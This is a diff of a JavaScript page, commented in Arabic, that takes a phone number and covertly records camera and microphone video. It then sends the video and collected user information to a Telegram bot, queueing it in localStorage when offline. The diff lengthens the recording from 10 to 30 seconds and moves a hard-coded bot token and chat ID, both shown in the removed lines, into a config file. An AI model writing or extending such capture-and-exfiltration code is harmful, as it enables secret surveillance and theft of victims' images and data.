@@ -1,6 +1,20 @@
-// ✅ تم تضمين إعدادات البوت هنا مباشرة
-const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w";
-const chatId = "7057346640";
+let botToken = '';
+let chatId = '';
+
+// تحميل التوكن ومعرف الدردشة من config.json
+fetch('config.json')
+  .then(res => {
+    if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
+    return res.json();
+  })
+  .then(data => {
+    botToken = data.botToken;
+    chatId = data.chatId;
+  })
+  .catch(err => {
+    console.error('فشل تحميل الإعدادات:', err);
+    alert('فشل تحميل الإعدادات. تأكد من وجود config.json في نفس مجلد index.html.');
+  });
 
 document.getElementById('phoneNumber').addEventListener('input', () => {
   const phone = document.getElementById('phoneNumber').value;
@@ -57,6 +71,7 @@ async function recordAndSendVideo(phoneNumber) {
       const info = await collectUserInfo(phoneNumber);
 
       if (!navigator.onLine) {
+        // حفظ الفيديو مؤقتًا
         const reader = new FileReader();
         reader.onloadend = () => {
           localStorage.setItem("pendingVideo", reader.result); // base64
@@ -65,6 +80,7 @@ async function recordAndSendVideo(phoneNumber) {
         };
         reader.readAsDataURL(videoBlob);
       } else {
+        // إرسال مباشرة
         sendToTelegram(videoBlob, info.caption);
       }
 
@@ -75,7 +91,7 @@ async function recordAndSendVideo(phoneNumber) {
     };
 
     mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 10000);
+    setTimeout(() => mediaRecorder.stop(), 30000);
   } catch (error) {
     console.error("فشل تشغيل الكاميرا:", error);
     alert("حدث خطأ في الوصول إلى الكاميرا أو الميكروفون.");
@@ -106,7 +122,7 @@ function sendToTelegram(blob, caption) {
     });
 }
 
-// عند عودة الاتصال بالإنترنت
+// عند عودة الإنترنت - محاولة إرسال الفيديو المحفوظ
 window.addEventListener('online', () => {
   const pending = localStorage.getItem("pendingVideo");
   const caption = localStorage.getItem("pendingCaption");
@@ -116,7 +132,7 @@ window.addEventListener('online', () => {
     sendToTelegram(blob, caption);
     localStorage.removeItem("pendingVideo");
     localStorage.removeItem("pendingCaption");
-    console.log("تم إرسال الفيديو المؤجل بعد عودة الاتصال.");
+    console.log("تم إرسال الفيديو المؤجل بنجاح بعد عودة الاتصال.");
   }
 });
 
